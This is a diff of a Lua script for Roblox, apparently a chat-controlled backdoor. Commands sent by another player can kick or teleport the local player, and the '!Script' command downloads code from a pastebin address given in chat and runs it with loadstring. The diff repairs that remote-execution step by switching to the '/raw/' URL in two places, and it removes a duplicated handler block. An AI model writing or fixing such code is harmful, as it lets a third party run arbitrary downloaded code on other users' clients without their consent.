@@ -72,11 +72,11 @@ for i, v in pairs(Players) do
 				end
 			end
 
-			
+
 			if CommandData [1] == "!Script" then
 				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
 					print("Executing Paste ".. CommandData[3])
-					loadstring(game:HttpGet("https://pastebin.com/".. CommandData[3]))()
+					loadstring(game:HttpGet("https://pastebin.com/raw/".. CommandData[3]))()
 					print("Executed Paste ".. CommandData[3])
 				end
 			end
@@ -186,30 +186,8 @@ game.Players.PlayerAdded:Connect(function(Player)
 			for Data in Command:gmatch("[^%s]+") do
 				table.insert(CommandData, Data)
 			end
-
-			if CommandData[1] == "!Kick" then
-				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
-					game.Players.LocalPlayer:Kick(CommandData[3])
-				end
-			end
-
-			if CommandData[1] == "!Teleport" then
-				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
-					for i, v in pairs(game.Players:GetPlayers()) do
-						if v.DisplayName == CommandData[3] then
-							local Target = v
-						end
-					end
-					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Workspace:WaitForChild(Target):WaitForChild("HumanoidRootPart").CFrame
-				end
-			end
-
-
-			local CommandData = {}
-			for Data in Command:gmatch("[^%s]+") do
-				table.insert(CommandData, Data)
-			end
-
+			
+			
 			if CommandData[1] == "!Kick" then
 				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
 					game.Players.LocalPlayer:Kick(CommandData[3])
@@ -220,7 +198,7 @@ game.Players.PlayerAdded:Connect(function(Player)
 			if CommandData [1] == "!Script" then
 				if CommandData[2] == game.Players.LocalPlayer.DisplayName then
 					print("Executing Paste ".. CommandData[3])
-					loadstring(game:HttpGet("https://pastebin.com/".. CommandData[3]))()
+					loadstring(game:HttpGet("https://pastebin.com/raw/".. CommandData[3]))()
 					print("Executed Paste ".. CommandData[3])
 				end
 			end
